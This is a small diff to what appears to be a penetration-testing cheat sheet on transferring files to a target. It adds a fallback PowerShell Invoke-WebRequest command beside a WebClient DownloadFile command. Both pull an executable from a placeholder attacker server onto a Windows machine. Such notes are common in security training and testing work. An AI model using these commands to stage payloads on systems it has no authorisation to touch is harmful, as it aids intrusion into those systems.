@@ -43,6 +43,8 @@ python3 -m http.server 8080
 
 ```powershell
 powershell -c (new-object System.Net.WebClient).DownloadFile('http://iamserver:port/xxxx.exe','C:\download\path\xxxx.exe')
+# If the abouve one fails
+powershell.exe -command Invoke-WebRequest -Uri 'http://iamserver:port/xxxx.exe' -OutFile 'C:\download\path\xxxx.exe'
 ```
 
 ##### FTP Transferring <a name='ftp'></a>
